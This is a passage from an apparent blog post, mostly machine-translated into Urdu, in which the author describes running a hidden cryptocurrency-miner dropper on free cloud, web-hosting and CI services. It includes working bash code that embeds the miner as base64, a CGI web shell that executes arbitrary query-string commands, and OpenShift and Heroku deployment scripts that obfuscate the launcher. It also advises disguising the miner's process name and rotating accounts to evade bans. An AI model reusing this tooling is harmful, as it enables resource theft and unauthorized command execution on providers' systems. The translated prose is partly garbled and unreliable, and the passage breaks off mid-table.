}</code></pre><p>یہ ہمیں صرف ایک لائن میں ترمیم کرنے کی اجازت دیتا ہے ، ملٹی لائن اندراجات کے لیے یہ صرف پہلی لائن پر غور کرتا ہے..لیکن یہ ہمارے استعمال کے معاملے کے لیے کافی اچھا ہے.<h2 id=runtime><a class=header-anchor href=#runtime> رن ٹائم</a></h2><p>ہمارا رن ٹائم کیسا لگتا ہے؟ ہمارے پاس مین باش پروسیس ہے جو مین لوپ ، پھر مائنر سب پروسیس ، سی پی یو مانیٹر سب پروسیس ، لاکر اور ٹونر پر عمل کرتا ہے۔ یہ تقریبا ایک مٹھی بھر ہے۔<p>سب سے پہلے ہم اس بات کو یقینی بنانا چاہتے ہیں کہ اگر کچھ غلط ہو جائے تو ہم کوئی گڑبڑ نہیں چھوڑتے ، اس کا مطلب یہ ہے کہ ہم ختم کرنے پر صفائی کرنے کے لیے باش ٹریپ کا استعمال کرتے ہیں<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> تکرار کو روکنے کے لیے جال کو کھولتا ہے۔ جال تمام ملازمتوں کو ختم کر دیتا ہے اور کام کا ماحول ہٹا دیتا ہے۔<p>مائنر شروع کرنے کا وقت آگیا ہے ، جو بیس 64 انکوڈنگ میں بش متغیر کے طور پر محفوظ ہے۔ ہم اسے فائل سسٹم پر پھینک دیتے ہیں ، پھر ہم کنفیگ کو ڈمپ کرتے ہیں ، مائنر کو چلاتے ہیں ، اور مائنر اور کنفیگ دونوں کو ہٹا دیتے ہیں۔ لینکس پر آپ چلنے والے عمل کے قابل عمل کو ہٹا سکتے ہیں ، (ونڈوز پر اس کی اجازت نہیں ہے)<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> جب کان کن چل رہا ہے ، فائل سسٹم پر صرف a ہے۔<code>.. /</code> a کے ساتھ ڈائریکٹری<code>b64</code> اس میں لنک.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>مائنر کو انکوڈ کرتے وقت بش کے ساتھ ایک پاگل پن کا سامنا کرنا پڑا وہ یہ ہے کہ ایک متغیر کو سبسیل کے ساتھ حوالوں کے ساتھ تفویض کرنا<code>myvar="$(something)"</code> میموری کے استعمال میں مستقل اضافے کا سبب بنتا ہے ، اسے ڈیبگ کرنا مشکل تھا اور واقعی میں اس طرح کے برتاؤ کی وجہ نہیں ملی ، ویسے بھی اسائنمنٹ کو بلا حوالہ رکھنا پڑتا ہے۔ اس کے بجائے ضابطہ کشائی کی جاتی ہے۔<em> وارثی</em> جو عارضی فائلوں پر ایک تجرید ہے ، متغیر کو ایک فائل میں پھینک دیا جاتا ہے جو پھر عمل میں پائپ کیا جاتا ہے۔<p>مائنر لمبی چلنے والی لوپ:<ul><li><p>جبکہ سچ<ul><li><p>مائنر کو روکیں<li><p>ترتیب کو ہٹا دیں<li><p>مائنر شروع کریں<li><p>جبکہ سچ<ul><li><p>ڈیمون شروع کریں<ul><li><p>جبکہ کان کن چل رہا ہے۔<ul><li><p>مائنر سے آؤٹ پٹ پڑھیں۔<li><p>آؤٹ پٹ لائن کی بنیاد پر مائنر ایکشن کا انتخاب کریں۔</ul></ul><li><p>اگر مائنر نہیں چل رہا ہے توڑیں۔</ul><li><p>نیند</ul></ul><p>آؤٹ پٹ لائن کچھ ریجیکس کے ساتھ مماثل ہے:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>ڈیمون ایسے معاملات کو سنبھالتا ہے جہاں۔<ul><li><p>اختتامی نقطہ سے رابطہ غلطیاں دیتا ہے (ایک نیا بے ترتیب اختتامی نقطہ چنیں)<li><p>ہیشنگ الگورتھم تبدیلیاں (نیند کا وقت اور ایڈہاک کنفیگریشن ایڈجسٹ کریں)<li><p>کان کنوں کے مسائل (مائنر کو دوبارہ شروع کریں)۔</ul><p>تھوڑی دیر کے لیے کمانڈ اینڈ کنٹرول ڈیش بورڈ کے لیے سپورٹ موجود تھی ، جس نے دستی دوبارہ شروع کرنے کی اجازت دی ، تاہم چونکہ اس کا استعمال کم سے کم تھا اس لیے اسے خارج کر دیا گیا ، اور اس کے اختتامی مقامات کو متبادل پول کنکشن سے تبدیل کر دیا گیا ، دوبارہ شروع کرنے کا عمل بھی غیر مستحکم ، پیچیدہ تھا۔ .. ٹیک قرض کی ایک اور مثال. تاہم اس نے ایک تازہ ترین پے لوڈ دوبارہ لانے اور فلائی پر تمام کنفیگریشنز کو دوبارہ سیٹ اپ کرنے کی اجازت دی ، جو کہ بہت عمدہ ٹرامپولین تھی۔<h2 id=debugging><a class=header-anchor href=#debugging> ڈیبگ کرنا۔</a></h2><p>تین اہم افادیتیں ہیں۔<ul><li><p>کوڈ بلاکس کے ارد گرد ٹریسنگ کو فعال/غیر فعال کریں (ہم متغیر میں b64 انکوڈڈ بائنری کا سراغ نہیں لگانا چاہتے ہیں۔)<li><p>نوشتہ جات کو فارمیٹ کرنے کے لیے ایک سادہ فنکشن۔<li><p>ایک جھنڈا جو کہ کھدائی شروع ہونے پر رن ​​ٹائم پر فعل لاگنگ کو چالو کرے گا۔<ul><li><p>فائل کرتا ہے<code>.debug</code> موجود؟<ul><li><p>وربوز لاگنگ کو فعال کریں۔</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> ہدف تعیناتیاں۔</a></h2><p>یہ سیٹ اپ 3 قسم کے میزبانوں پر آزمایا گیا ہے۔<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> خود میزبان کنٹینرز یا VMs۔</a></h3><p>بہت سے ہوسٹنگ فراہم کرنے والے کان کنی کو پسند نہیں کرتے کیونکہ سی پی یو کے وسائل ایک سے زیادہ صارفین کے درمیان بانٹے جاتے ہیں ، اور کان کنی کا سافٹ ویئر باقی صارفین کی کارکردگی کو متاثر کرنے والے میزبان نوڈ کو آسانی سے سست کر سکتا ہے۔ یہ درست ہوسکتا ہے یہاں تک کہ اگر سی پی یو صارف کا وقت لامحدود ہے ، کیونکہ ہیشنگ الگورتھم سی پی یو کی تمام کیچنگ تہوں کو پورا کرسکتا ہے اگر کیشے کو تمام سی پی یو کوروں میں بانٹ دیا جائے۔<p>ہم اپنا استعمال کرنا چاہتے ہیں۔<em> منصفانہ</em> پابندی کے بغیر وسائل کا حصہ ، یہ ہمارے اسٹیلتھ ڈراپر کے لیے ایک اچھا استعمال ہے کیونکہ یہ میزبان کے استعمال سے آگاہ ہے ، جس کا مطلب ہے<em> چاہئے</em> [AUP] کے اندر رہو سیلف میزبان تعیناتیوں سے نمٹنے کے وقت کوئی اضافی اقدامات نہیں ہیں ، صرف لانچر اسکرپٹ ، شاید بوٹ تسلسل میں شامل کیا جائے یا دستی طور پر لانچ کیا جائے۔<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> cPanel پر مبنی ویب ہوسٹنگ</a></h3><p>ویب ہوسٹنگ سبسکرپشنز کے منصوبے زیادہ تر [cPanel] کے ذریعے پیش کیے جاتے ہیں۔ ایک بار پھر ہم ذاتی سبسکرپشن پلان استعمال کر رہے ہیں جس میں وسائل کی معقول حد ہے ، دوسری طرف کسی بھی مفت پلان کی مضحکہ خیز حدود ہیں<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . سی پینل آپ کو مختلف فائل ایکسٹینشنز کے لیے ہینڈلرز کی وضاحت کرنے کی اجازت دیتا ہے ، اس سے ہمیں شیل اسکرپٹس کو<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> سی جی آئی</a> سرور پر اپ لوڈ کردہ شیل اسکرپٹ کے خلاف http درخواست کے ساتھ۔ اس قسم کے انٹرفیس ویب شیل کی طرح دکھائی دیتے ہیں۔<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . ایک سادہ باز ویب شیل۔<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>بہتر ہے کہ صرف بلٹ ان پر بھروسہ کیا جائے کیونکہ ویب جیلوں میں اضافی عمل کی اجازت نہیں دی جا سکتی ، لیکن یہ ہمیشہ ممکن ہے<code>exec</code> جو ہمیں کمانڈ لائن کی زیادہ تر افادیت استعمال کرنے کی اجازت دیتا ہے۔ زیادہ تر ویب شیل دیگر اسکرپٹنگ زبانوں میں لکھے جاتے ہیں جیسے ازگر یا پی ایچ پی کیونکہ آپ کو کانٹے کے بارے میں فکر کرنے کی ضرورت نہیں ہے۔<p>ایک cpanel ماحول میں کان کن عمل کے لیے ایک مستحکم نام استعمال کرنا بہتر ہے ، جیسے۔<code>httpd</code> یا<code>php-fpm</code> کیونکہ<code>cgi</code> کثیر پروسیسنگ پر مبنی ہے ، لہذا سرور ہمیشہ اس طرح کے بہت سے عمل سے بھرے رہتے ہیں ، حالانکہ ایک محتاط مبصر کو نوٹس لینا چاہیے<em> کثیر تھریڈڈ</em> استعمال کا نمونہ جو کہ پرل ، پی ایچ پی ، روبی ، یا ازگر جیسی زبانوں کے لیے یقینی طور پر عام (یا ممکن) نہیں ہے!<p>پروسیس کی ڈیفالٹ طور پر بھی ایک وقت کی حد ہوتی ہے ، (1 گھنٹہ ، 1 دن ، وغیرہ۔) ، اس کے لیے ہم صرف ایک کرون جاب استعمال کرتے ہیں جو ڈراپر کو دوبارہ شروع کرتا ہے۔<p>اس کے لیے بہت زیادہ مینوئل ایڈیٹنگ درکار ہے ، cpanel api کو خودکار بنانے کے لیے یہ بدقسمتی سے اختتامی صارفین کے سامنے نہیں ہے ، لہذا ویب ہوسٹنگ ہمارے مائنر ڈراپر کے لیے ایک گھناؤنا اور بورنگ ہدف ہے۔<h3 id=web_environments><a class=header-anchor href=#web_environments> ویب ماحول</a></h3><p>وہاں ہے<em> ساس۔</em> فراہم کنندگان جن کے پاس ایک ویب ایڈیٹر ہے اور کنٹینر ہے ، جیسے۔<a href="with a free tier before getting acquired by amazon"> بادل 9</a> ، [codeanywhere] ، [codenvy]۔ ڈراپر کو یہاں تعینات کرنا آسان ہے (آپ کے پاس ایک مکمل ماحول ہے) ، لیکن اسے چلاتے رہنا ایک بوجھ ہے ، کیونکہ کوئی بھی انٹرایکٹو ویب ایڈیٹر ویب پیج بند ہونے کے فورا بعد اپنا سیشن ختم کر دیتا ہے ، اور کنٹینر کے نتیجے میں سو جاتا ہے (جب تک آپ یقینا ادا کریں)<p>اس کو گھمانے کا مطلب صرف یہ ہو سکتا ہے کہ ہمیں سیشنز کو کھلا رکھنا ہے ، کچھ سکرپٹنگ کے ساتھ [puppeteer] نے مطلوبہ نتیجہ حاصل کیا ، لیکن طویل عرصے تک چلنا ، میموری لیک ہونا ، پھولا ہوا SPAs ویب پیج ہونا یقینی طور پر ناگوار ہے اور چپکے سے نہیں ، کیونکہ فراہم کنندہ کی طرف سے ، 24/7 کھولا جانے والا سیشن یقینی طور پر مشکوک نظر آئے گا۔ درحقیقت ، ویب ماحول بھی پیچیدہ اور بورنگ اہداف ہیں۔<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> مفت ایپس سروسز۔</a></h3><p>یہ بنیادی طور پر ہے۔<a href="when it used to have a free tier"> اوپن شفٹ</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> اور [ہیروکو] اوپنشفٹ ، کبرنیٹس ہونے کے ناطے تعینات کرنا کچھ سیدھا تھا ، لیکن کنفگریشن سے بھرا ہوا ، یہاں ایک اقتباس ہے:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>یہ وہ سکرپٹ تھا جو کان کنی کے کنٹینر کی تعمیر کے لیے استعمال کیا جاتا تھا جس کے لیے یمل ٹیمپلیٹ درکار ہوتا تھا۔<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>لیکن اس پورے عمل میں بہت سارے اقدامات شامل تھے!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>چھدم کوڈ میں:<ul><li><p>پروجیکٹ بنائیں<li><p>تصویر کے بغیر ایپلیکیشن بنائیں۔<li><p>کان کنی کنٹینر بنائیں<li><p>کنٹینر کو تعیناتی کی ترتیب کے ساتھ تعینات کریں (کبرنیٹس خلاصہ)<li><p>تعیناتی کو رول آؤٹ کریں۔</ul><p>کی<code>build-build</code> سکرپٹ بجائے a<em> تعمیر</em> کنٹینر جو ایک وقت میں چند گھنٹوں کے لیے میرا ہو گا۔ بلڈ اور نارمل پھلیوں کے اوپن شفٹ میں الگ الگ وسائل ہوتے ہیں لہذا ہم نے ان دونوں کا استحصال کیا۔ اوپنشفٹ مجموعی طور پر ایک برا تجربہ تھا کیونکہ یہ 4 مختلف ریلیزز (شاید زیادہ ، میں نے تھوڑی دیر کے بعد ٹریک کرنا بند کر دیا) اور ان میں سے ہر ایک کو کنفیگریشن میں تبدیلی کی ضرورت تھی ، ان کے پاس اپ گریڈ کے راستے نہیں تھے اور ہر چیز کو تیزی سے دہرایا گیا تھا ، اور یہ عام تھا تعمیرات/پھلیوں کو روکنے کے لیے ، اور کچرا اکٹھا نہ کرنے کے لیے ... وہ عام طور پر ہر بار تھوڑی دیر میں دستی طور پر دوبارہ شروع کرتے تھے ، شاید کبرنیٹس صرف چھوٹی چھوٹی تھی :)<p>ہیروکو کنفیگریشن تھوڑا سا آسان تھا (اس میں کبرنیٹس شامل نہیں ہیں)۔ کنٹینر بلڈ کے علاوہ ، جو اوپن شفٹ ون کی طرح تھا ، باقی صرف دو کلی کمانڈز تھے۔<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>کنٹینر کو براہ راست ڈاکر کے ساتھ ہیروکو رجسٹری کی طرف دھکیل دیا گیا۔<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> ہیروکو کے ساتھ رگڑ (جو کہ فری ٹائر ابھی تک لکھنے کے وقت تک کھڑا ہے) یہ ہے کہ ڈائنوس صرف 22 دن فی مہینہ چل سکتا ہے لہذا انہیں ہر ماہ کچھ دستی انتظام کی ضرورت ہوتی ہے ، پھر مشکل اور بورنگ۔ انہوں نے شروع میں کچھ پابندی کی لہروں پر عمل کیا ، اور پھر انہوں نے ٹی او آر کے ذریعے رجسٹریشن کو غیر فعال کردیا ، مجھے یقین ہے کہ میں اس کی وجہ تھا۔<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> CI کنٹینرز یا VMs۔</a></h3><p>یہ ہمارے ڈراپر کے لیے انتہائی ہم آہنگ اہداف تھے۔ بہت ہیں<a href=https://en.wikipedia.org/wiki/Continuous_integration> سی آئی</a> کمپنیاں ، جن میں سے بہت سے سرمایہ کاروں کے پیسے جلا رہے ہیں ، ٹیک انفراسٹرکچر کے کاروبار میں کچھ مارکیٹ شیئر اکٹھا کرنے کی امید میں مفت درجے پیش کرتے ہیں۔<p>یہ تمام خدمات مختلف وسائل پیش کرتی ہیں ، مختلف ترتیب کی ضروریات ہیں اور مختلف ماحول میں چلتی ہیں۔ میں نے کبھی بھی خودکار اکاؤنٹ رجسٹریشن پر غور نہیں کیا کیونکہ اس قسم کی چیزیں پروگرام کے لیے خوفناک ہوتی ہیں ، میں ہر وقت ان سے بچنے کی کوشش کرتا ہوں ، اس لیے میں نے تھوڑی دیر کے لیے صرف دستی رجسٹریشن کو برداشت کیا کیونکہ مجھے تجسس تھا کہ مجھے کس قسم کا اینٹی سپیم رسپانس ملے گا (اور باقیوں سے کتنا مختلف!) آپ کمپنی کے انتظام کے بارے میں کچھ چیزوں کا اندازہ لگا سکتے ہیں کہ وہ سپیم کو کس طرح سنبھالتی ہے۔<ul><li><p>کیا یہ پابندی کی لہروں کو انجام دیتا ہے؟ پھر ان کے پاس غیر سخت پالیسیاں ہیں ، مسائل کو دستی طور پر سنبھالا جاتا ہے اور کیس کیس کے مطابق۔<li><p>کیا اسے فون کی تصدیق کی ضرورت ہے؟ ماضی میں ان کے ساتھ بدسلوکی کی گئی۔<li><p>کیا وہ بھاری وسائل کے استعمال کا جواب دیتے ہیں؟ وہ سخت بجٹ پر چل رہے ہیں۔<li><p>کیا وہ اکاؤنٹ کی پابندی لگاتے ہیں یا شیڈو پابندی؟ اگر وہ پابندی کے سائے میں ہیں ، تو ان کے پاس سیسڈمین ہیں۔</ul><p>ایک فلسفیانہ سوال بھی ہے: اگر کوئی سروس آپ کو ان کے نظام کو طویل عرصے تک غلط استعمال کرنے کی اجازت دیتی ہے ، تو کیا اس کا مطلب یہ ہے کہ ان کے پاس ایک اعلی ترین شیلف انفراسٹرکچر ہے جو بوجھ کو سنبھالنے کی صلاحیت رکھتا ہے ، یا صرف اپنے سسٹم پر ناقص کنٹرول رکھتا ہے؟ اور آپ کو رسائی اور سیکورٹی کے درمیان توازن پر غور کرنا چاہیے ، بہت زیادہ محفوظ نظام صارف کی برقراری کو کم کر سکتا ہے۔<p>یہاں ایک ٹیبل ہے جس میں کچھ خدمات دکھائی گئی ہیں جن میں میں نے تعینات کیا ہے:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>ترتیب<th style=text-align:center>کارکردگی<th style=text-align:center>ہتھوڑا<tr><td style=text-align:center>بٹ رائز۔<td style=color:red;text-align:center>برا<td style=color:#ff0;text-align:center>میڈیم<td style=color:#ff0;text-align:center>میڈیم<tr><td style=text-align:center>ٹریوس۔<td style=color:green;text-align:center>اچھی<td style=color:#ff0;text-align:center>میڈیم<td style=color:green;text-align:center>اچھی<tr><td style=text-align:center>کوڈ شپ<td style=color:#ff0;text-align:center>میڈیم<td style=color:red;text-align:center>برا<td style=color:#ff0;text-align:center>میڈیم<tr><td style=text-align:center>گٹلیب۔<td style=color:#ff0;text-align:center>میڈیم<td style=color:green;text-align:center>اچھی<td style=color:green;text-align:center>اچھی<tr><td style=text-align:center>سرکلسی۔<td style=color:red;text-align:center>برا<td style=color:green;text-align:center>اچھی<td style=color:#ff0;text-align:center>میڈیم<tr><td 